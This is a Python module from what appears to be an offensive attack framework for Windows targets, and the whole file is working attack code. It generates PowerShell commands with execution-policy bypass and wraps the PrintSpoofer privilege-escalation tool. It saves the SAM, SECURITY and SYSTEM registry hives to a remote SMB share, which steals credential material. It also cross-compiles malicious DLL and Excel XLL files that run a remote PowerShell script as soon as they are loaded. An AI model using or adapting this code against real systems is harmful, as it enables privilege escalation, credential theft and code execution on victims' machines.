import subprocess


class Payload:
    ext = ""

    def __init__(self, smb_server_object, make_file=True, input_files=None):
        self.smb_server_object = smb_server_object
        self.payload = ""
        self.output_files = []
        self.input_files = input_files if input_files else []
        self.file = None
        self.generate()
        if make_file:
            self.file = self.smb_server_object.create_temp_file(content=self.payload, ext=self.ext)

    def generate(self):
        self.payload = "NotImplemented!!"

    def await_output_files(self):
        for output_file in self.output_files:
            output_file.await_me()
        

class PowershellRunner(Payload):
    def __init__(self, smb_server_object, input_files):
        super().__init__(smb_server_object, False, input_files)

    def generate(self):
        if self.payload:
            return
        self.payload = f"powershell.exe -ep bypass {self.input_files[0].remote_path}"


class PrintSpoofer(Payload):
    ext = ".ps1"

    def generate(self):
        if self.payload:
            return
        runner = PowershellRunner(self.smb_server_object, [self.input_files[1]])
        print_spoofer = f'{self.input_files[0].remote_path} -c "{runner.payload}"'
        self.payload = print_spoofer


class SamDumpPowershell(Payload):
    ext = ".ps1"

    def generate(self):
        if self.payload:
            return
        self.sam = self.smb_server_object.future_file()
        self.security = self.smb_server_object.future_file()
        self.system = self.smb_server_object.future_file()
        self.output_files += [self.sam, self.security, self.system]
        powershell_command = f"reg save hklm\\sam {self.sam.remote_path}\nreg save hklm\\security {self.security.remote_path}\nreg save hklm\\system {self.system.remote_path}"
        self.payload = powershell_command


class CRunPowershell(Payload):
    ext = ".dll"
    compiler = "/usr/bin/x86_64-w64-mingw32-gcc"

    def __init__(self, smb_server_object, input_files):
        super().__init__(smb_server_object, make_file=False, input_files=input_files)

    def generate(self):
        self.file = self.smb_server_object.create_temp_file(content="placeholder because gcc cant compile to stdout", ext=self.ext)
        powershell = PowershellRunner(self.smb_server_object, self.input_files)
        self.payload = '#include <windows.h>\n\nBOOL APIENTRY DllMain(HMODULE hModule,DWORD ul_reason_for_call,LPVOID lpReserved){switch (ul_reason_for_call){case DLL_PROCESS_ATTACH:system("'
        self.payload += powershell.payload
        self.payload += '");break;default:break;}return TRUE;}'
        with subprocess.Popen([self.compiler, "-shared", "-o", self.file.local_path, "-xc", "-"], stdin=subprocess.PIPE) as process:
            process.communicate(input=self.payload.encode())


class CRunPowershellXll(Payload):
    ext = ".xll"
    compiler = "/usr/bin/x86_64-w64-mingw32-gcc"

    def __init__(self, smb_server_object, input_files):
        super().__init__(smb_server_object, make_file=False, input_files=input_files)

    def generate(self):
        self.file = self.smb_server_object.create_temp_file(content="placeholder because gcc cant compile to stdout", ext=self.ext)
        powershell = PowershellRunner(self.smb_server_object, self.input_files)
        self.payload = '#include <windows.h>\n\nvoid xlAutoOpen() {system("'
        self.payload += powershell.payload
        self.payload += '");}'
        print(self.payload)
        with subprocess.Popen([self.compiler, "-shared", "-o", self.file.local_path, "-xc", "-"], stdin=subprocess.PIPE) as process:
            process.communicate(input=self.payload.encode())
